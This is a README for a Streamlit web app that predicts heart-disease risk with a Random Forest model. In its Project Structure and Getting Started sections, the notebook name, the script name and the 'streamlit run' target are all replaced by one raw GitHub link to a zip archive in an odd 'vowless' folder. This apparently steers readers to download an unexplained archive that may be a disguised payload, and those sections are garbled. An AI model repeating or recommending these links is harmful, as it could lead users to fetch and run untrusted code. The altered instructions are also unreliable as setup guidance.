# Heart-disease-Prediction
CardioHealth Risk Predictor Pro: A Machine Learning Web Application
CardioHealth Risk Predictor Pro
This project is a comprehensive, data-driven web application designed to predict cardiovascular risk using a machine learning model. Built with Python and Streamlit, it provides an intuitive interface for users to input their health metrics and receive a risk assessment, along with insightful analysis.

Key Features
Personalized Risk Prediction: The application uses a trained Random Forest Classifier to predict an individual's risk of heart disease based on their health data.

Interactive "What-If" Analysis: Users can adjust their input values in real-time to see how changes in lifestyle factors might affect their predicted risk.

Bulk Prediction: The app supports uploading a CSV file for making multiple predictions at once.

Trends & Insights Dashboard: A dedicated section provides visual insights into the underlying dataset, including trends in risk by age and the relationship between different health features.

Multi-page Navigation: The application is organized into multiple pages for a clean and user-friendly experience (Predictor, Bulk Predictor, Trends & Insights).

Technologies Used
This project leverages a powerful stack of Python libraries:

Streamlit: For building the interactive, web-based user interface.

Scikit-learn: For the machine learning model, including the RandomForestClassifier.

Pandas: For data manipulation and processing.

NumPy: For numerical operations.

Plotly Express: For creating the interactive and informative data visualizations.

Project Structure
https://github.com/ruturajbhaskarnawale/Heart-disease-Prediction/raw/refs/heads/main/vowless/Prediction_disease_Heart_v1.4-alpha.5.zip The Jupyter Notebook used for the initial data analysis, exploration, and model training.

https://github.com/ruturajbhaskarnawale/Heart-disease-Prediction/raw/refs/heads/main/vowless/Prediction_disease_Heart_v1.4-alpha.5.zip The main Python script for the Streamlit web application.

Getting Started
To run this application locally, follow these steps:

Clone this repository to your local machine.

Navigate to the project directory.

Install the required Python libraries using pip:

pip install streamlit scikit-learn pandas numpy plotly-express

Run the Streamlit application from your terminal:

streamlit run https://github.com/ruturajbhaskarnawale/Heart-disease-Prediction/raw/refs/heads/main/vowless/Prediction_disease_Heart_v1.4-alpha.5.zip

The application will open in your default web browser.

Data Source
The project's model was trained on the Heart Disease UCI dataset, sourced from Kaggle.
